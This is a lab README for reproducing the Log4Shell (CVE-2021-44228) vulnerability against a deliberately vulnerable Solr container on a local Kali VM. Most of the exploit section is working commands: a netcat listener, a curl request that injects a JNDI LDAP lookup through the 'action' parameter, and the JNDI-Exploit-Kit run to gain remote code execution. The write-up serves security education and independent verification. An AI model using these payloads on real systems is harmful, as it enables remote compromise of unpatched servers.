# Software Supply-Chain Dependency

## Running the Lab

This setup assumes a freshly installed Kali Linux VM. By following the installation instructions the artifacts from the report can be independently verified.

Three terminals are used during testing, detailed here. All terminals are used on Kali, with some executing commands on the Solr host.

| Terminal                 | Role                                                                |
| ------------------------ | ------------------------------------------------------------------- |
| **Terminal 1 — Control** | setup, Docker, recon, scanning, firing payloads, mitigation, retest |
| **Terminal 2 — Server**  | netcat listener (3a), then the JNDI-Exploit-Kit (3b, retest)        |

**Assume commands to be on Terminal 1 unless explicitly stated otherwise.**

To begin with, run the following commands in Terminal 1 on the Kali VM:

### To install the initial dependencies for testing

```bash
sudo apt update
sudo apt install -y docker.io docker-compose default-jdk maven git curl zip nmap netcat-traditional
sudo systemctl enable --now docker

# Run Docker without sudo for the rest of the lab for simplicity
sudo usermod -aG docker "$USER"
newgrp docker        # or log out and back in once
docker ps            # should succeed with an empty list, no sudo
```

Installing the SCA tools for testing:

```bash
# Syft (SBOM) and Grype (second scanner), via Anchore's installers:
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh  | sudo sh -s -- -b /usr/local/bin
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin

# osv-scanner (primary). Check the releases page for the current asset name.
sudo curl -sSfL -o /usr/local/bin/osv-scanner \
  "https://github.com/google/osv-scanner/releases/latest/download/osv-scanner_linux_amd64"
sudo chmod +x /usr/local/bin/osv-scanner

# Verify everything resolves:
docker --version && java -version && mvn -version && osv-scanner --version && syft version && grype version
```

Creating a working directory for the lab:

```bash
mkdir -p ~/log4shell-lab && cd ~/log4shell-lab
```

### Building the Solr Target

Cloning and installing the vulnerable target from VulnHub:

```bash
cd ~/log4shell-lab
git clone https://github.com/vulhub/vulhub.git
cd vulhub/log4j/CVE-2021-44228
docker compose up -d
# Solr Admin UI: http://127.0.0.1:8983
```

Establishing the network. From here, this terminal instance will be known as terminal 1.

```bash
docker network ls                      # note the Vulhub network (e.g. cve-2021-44228_default)
ATTACKER=$(docker network inspect cve-2021-44228_default -f '{{(index .IPAM.Config 0).Gateway}}')
TARGET=127.0.0.1
echo "ATTACKER (Kali host as seen by the container) = $ATTACKER"   # e.g. 172.18.0.1
echo "TARGET (Solr, from the Kali host)             = $TARGET"
```

![alt text](Images/networksetup.png)
*Figure: Network setup used during testing.*

Confirming the presence of the vulnerable log4j dependency.

```bash
docker compose exec solr find /opt -name 'log4j-core-*.jar'
#   -> /opt/solr/server/lib/ext/log4j-core-2.14.1.jar
```

![alt text](Images/vulnerablelog4jinsolr.png)
*Figure: The vulnerable log4j-2.14.1 component present within Solr 8.11.0.*

### Conducting the Exploit

Recon to confirm Solr is up and running on port 8983 via nmap.

```bash
nmap -sV -p 8983 "$TARGET"             # Solr Admin UI on 8983
```

#### On Future Commands

The Solr cores admin endpoint logs its `action` parameter through Log4j, so `action` is the injection point used for exploitation.

```
GET /solr/admin/cores?action=<PAYLOAD>
```

---

**Terminal 2:**

Creating a Listener

```bash
nc -lvnp 1389                          # waits for the inbound LDAP connection
```

---

**Terminal 1:**

Proving that an attacker initiated JNDI lookup can occur due to the log4j component.

```bash
curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/test}"
```

![alt text](Images/injectionsupplychainconfirmed.png)
*Figure: Solr performs an attacker-directed JNDI lookup, confirming injection.*

#### Escalating to RCE

Create and compile the payload using the JNDI Lookup kit.

```bash
cd ~/log4shell-lab
git clone https://github.com/pimps/JNDI-Exploit-Kit.git
export MAVEN_OPTS="-Djdk.util.zip.disableZip64ExtraFieldValidation=true"
cd JNDI-Exploit-Kit && mvn clean package -DskipTests && cd ~/log4shell-lab
ls JNDI-Exploit-Kit/target/*-all.jar       # confirm the exact jar name
#   -> target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
```

---

**Terminal 2:**

```bash
newgrp docker            
docker ps                
ATTACKER=$(docker network inspect cve-2021-44228_default -f '{{(index .IPAM.Config 0).Gateway}}')
echo "$ATTACKER"         # must print 172.18.0.1 or IP
cd ~/log4shell-lab/JNDI-Exploit-Kit
java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned" -L "$ATTACKER:1389"
# expect: [LDAP_ADDR] >> 172.18.0.1
```

---

**Terminal 1:***

Use the LDAP link for KITPATH under “JDK 1.8 whose trustURLCodebase is true”, in my case:

```
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://172.18.0.1:1099/uj9v6c
ldap://172.18.0.1:1389/uj9v6c
```

Run the following:

```bash
curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/<KIT-PATH>}"
```

(In my case)

```bash
curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/uj9v6c}"
```

Then use the following to verify RCE:

```bash
cd ~/log4shell-lab/vulhub/log4j/CVE-2021-44228
docker compose exec solr ls -l /tmp/pwned
#   -> -rw-r--r-- ... /tmp/pwned
```

![alt text](Images/RCEConfirmed.png)
*Figure: Successful RCE confirmed on the left, with the LDAP server on the right confirming JNDI Lookup.*
